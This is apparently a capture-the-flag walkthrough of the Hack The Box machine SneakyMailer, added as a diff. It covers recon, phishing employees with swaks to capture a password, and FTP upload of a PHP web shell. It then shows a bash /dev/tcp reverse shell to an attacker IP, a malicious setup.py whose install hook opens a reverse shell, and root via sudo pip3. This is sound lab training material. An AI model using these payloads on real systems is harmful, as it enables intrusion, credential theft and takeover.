@@ -1,0 +1,312 @@
+let's enumerate it:
+command: sudo rustscan -a 10.10.10.197
+result:
+PORT     STATE SERVICE    REASON
+21/tcp   open  ftp        syn-ack ttl 63
+22/tcp   open  ssh        syn-ack ttl 63
+25/tcp   open  smtp       syn-ack ttl 63
+80/tcp   open  http       syn-ack ttl 63
+143/tcp  open  imap       syn-ack ttl 63
+993/tcp  open  imaps      syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 21,22,25,80,143,993,8080 10.10.10.197
+result:
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 57c900353656e66ff6de8640b2ee3efd (RSA)
+|   256 d82123281db83046e2672d5965f00a05 (ECDSA)
+|_  256 5e4f234ed4908ee95e8974b3190cfc1a (ED25519)
+25/tcp   open  smtp     Postfix smtpd
+|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+80/tcp   open  http     nginx 1.14.2
+|_http-title: Employee - Dashboard
+|_http-server-header: nginx/1.14.2
+143/tcp  open  imap     Courier Imapd (released 2018)
+|_imap-capabilities: IDLE ACL2=UNION UIDPLUS NAMESPACE completed CHILDREN ACL OK QUOTA CAPABILITY STARTTLS THREAD=REFERENCES IMAP4rev1 ENABLE UTF8=ACCEPTA0001 THREAD=ORDEREDSUBJECT SORT
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+993/tcp  open  ssl/imap Courier Imapd (released 2018)
+|_imap-capabilities: IDLE ACL2=UNION UIDPLUS NAMESPACE completed CHILDREN AUTH=PLAIN OK QUOTA CAPABILITY UTF8=ACCEPTA0001 THREAD=REFERENCES IMAP4rev1 ENABLE THREAD=ORDEREDSUBJECT ACL SORT
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+8080/tcp open  http     nginx 1.14.2
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Welcome to nginx!
+|_http-server-header: nginx/1.14.2
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+test port 21
+command: ftp 10.10.10.197
+result:
+530 Permission denied.
+ftp: Login failed
+
+access: http://10.10.10.197/ redirect -> http://sneakycorp.htb/
+command: wfuzz -c -w /snap/seclists/34/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.10.197 -H "Host: FUZZ.sneakycorp.htb" --hh 185
+result: 
+/dev
+
+add this 10.10.10.197 sneakycorp.htb dev.sneakycorp.htb 
+to /etc/hosts
+
+access: http://sneakycorp.htb/
+access: http://sneakycorp.htb/team.php
+command: curl -s http://sneakycorp.htb/team.php | grep '@' | cut -d '>' -f2 | cut -d '<' -f1 > emails
+command: wc -l emails; head -5 emails 
+result: 
+57 emails
+tigernixon@sneakymailer.htb
+garrettwinters@sneakymailer.htb
+ashtoncox@sneakymailer.htb
+cedrickelly@sneakymailer.htb
+airisatou@sneakymailer.htb
+
+command: gobuster dir -u http://sneakycorp.htb -w /snap/seclists/34/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 20 
+result:
+/index.php            (Status: 200) [Size: 13543]
+/img                  (Status: 301) [Size: 185] [--> http://sneakycorp.htb/img/]
+/css                  (Status: 301) [Size: 185] [--> http://sneakycorp.htb/css/]
+/team.php             (Status: 200) [Size: 26518]
+/js                   (Status: 301) [Size: 185] [--> http://sneakycorp.htb/js/]
+/vendor               (Status: 301) [Size: 185] [--> http://sneakycorp.htb/vendor/]
+/pypi                 (Status: 301) [Size: 185] [--> http://sneakycorp.htb/pypi/]
+
+access: http://dev.sneakycorp.htb/pypi/
+return: 403
+
+access: http://dev.sneakycorp.htb:8080/
+return: nginx
+
+command: sudo python3 -m http.server 80
+command: swaks --to $(cat emails | tr '\n' ',' | less ) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.16.19/" --server 10.10.10.197
+result: 
+10.10.10.197 - - [22/Jun/2023 01:25:42] "POST / HTTP/1.1" 501 -
+let's try nc 
+command: sudo nc -lvnp 80
+result:
+Connection received on 10.10.10.197 43038
+POST / HTTP/1.1
+Host: 10.10.16.19
+User-Agent: python-requests/2.23.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 185
+Content-Type: application/x-www-form-urlencoded
+
+firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+email: paulbyrd@sneakymailer.htb
+password: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
+
+please open evolution
+new mail account
+
+fullname: paulbyrd
+email address: paulbyrd@sneakymailer.htb
+receiving email: 
+-> server type: IMAP
+-> server: 10.10.10.197
+-> username: paulbyrd
+sending email:
+-> server: 10.10.10.197
+-> encryption method: STARTTLS after connecting
+password: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
+
+read send items:
+Hello administrator, I want to change this password for the developer account
+ 
+Username: developer
+Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+ 
+Please notify me when you do it
+
+command: ftp 10.10.10.197
+Name: developer
+password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+ftp> cd /dev
+let's create out payload on host:
+command: cat 0xdf.php 
+<?php system($_REQUEST["cmd"]); ?>
+ftp> cd /dev
+please execute faster because payload will remove 
+ftp> put /home/donika-pentest/Documents/0xdf.php 0xdf.php
+host> curl http://dev.sneakycorp.htb/0xdf.php --data-urlencode "cmd=id"
+result:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+let's execute quick
+host> nc -lvnp 7979 
+ftp> put /home/donika-pentest/Documents/0xdf.php 0xdf.php
+host> curl http://dev.sneakycorp.htb/0xdf.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.19/7979 0>&1'"
+
+command: /etc/nginx/sites-enabled
+command: cat pypi.sneakycorp.htb 
+server {
+	listen 0.0.0.0:8080 default_server;
+	listen [::]:8080 default_server;
+	server_name _;
+}
+
+
+server {
+	listen 0.0.0.0:8080;
+	listen [::]:8080;
+
+	server_name pypi.sneakycorp.htb;
+
+	location / {
+		proxy_pass http://127.0.0.1:5000;
+		proxy_set_header Host $host;
+		proxy_set_header X-Real-IP $remote_addr;
+	}
+}
+
+command: cat sneakycorp.htb 
+server {
+	listen 0.0.0.0:80 default_server;
+	listen [::]:80 default_server;
+	return 301 http://sneakycorp.htb;
+	server_name _;
+}
+
+
+server {
+	listen 0.0.0.0:80;
+	listen [::]:80;
+
+	server_name sneakycorp.htb;
+
+	root /var/www/sneakycorp.htb;
+	index index.php;
+	location / {
+		try_files $uri $uri/ =404;
+	}
+	location ~ \.php$ {
+		include snippets/fastcgi-php.conf;
+		fastcgi_pass unix:/run/php/php7.3-fpm.sock;
+	}
+}
+
+server {
+	listen 0.0.0.0:80;
+	listen [::]:80;
+
+	server_name dev.sneakycorp.htb;
+
+	root /var/www/dev.sneakycorp.htb/dev;
+	index index.php;
+	location / {
+		try_files $uri $uri/ =404;
+	}
+	location ~ \.php$ {
+		include snippets/fastcgi-php.conf;
+		fastcgi_pass unix:/run/php/php7.3-fpm.sock;
+	}
+}
+
+add pypi.sneakycorp.htb to /etc/hosts
+
+access: http://pypi.sneakycorp.htb:8080/
+command: mkdir revshell
+create structure file like below:
+tree
+.
+├── dist
+│   └── revshell-0.0.1.tar.gz
+├── README.md
+├── revshell
+│   └── __init__.py
+├── revshell.egg-info
+│   ├── dependency_links.txt
+│   ├── not-zip-safe
+│   ├── PKG-INFO
+│   ├── SOURCES.txt
+│   └── top_level.txt
+├── setup.cfg
+└── setup.py
+
+read this tutorial:
+https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/
+
+code setup.py like this:
+import os
+import socket
+import subprocess
+from setuptools import setup
+from setuptools.command.install import install
+
+class Exploit(install):
+    def run(self):
+        RHOST = '10.10.16.19'
+        RPORT = 4444
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((RHOST, RPORT))
+        for i in range(3):
+            os.dup2(s.fileno(), i)
+        p = subprocess.call(["/bin/sh","-i"])
+
+setup(name='revshell',
+      version='0.0.1',
+      description='Reverse Shell',
+      author='0xdf',
+      author_email='0xdf',
+      url='http://sneakycopy.htb',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': Exploit})
+
+command: python3 setup.py sdist
+command: cd dist
+dist folder created
+
+command: cat ~/.pypirc 
+[distutils]
+index-servers=
+  sneaky
+[sneaky]
+repository: http://pypi.sneakycorp.htb:8080
+username: pypi
+password: soufianeelhaoui
+
+command: nc -lvnp 4444
+command: python3 setup.py sdist upload -r sneaky
+
+command: id && whoami
+uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)
+low
+command: sudo -l
+result:
+sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
+Matching Defaults entries for low on sneakymailer:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User low may run the following commands on sneakymailer:
+    (root) NOPASSWD: /usr/bin/pip3
+
+let's change port on revshell to 7979, create dist then upload it
+command: python3 setup.py sdist
+
+host> nc -lvnp 7979
+target> cd revshell-0.0.1
+target> sudo pip3 install .
+
+root> cat /root/root.txt
+result:
+3b27773ff023674bc789ce1e77acad21
+
+resource:
+https://0xdf.gitlab.io/2020/11/28/htb-sneakymailer.html#priv-low--root
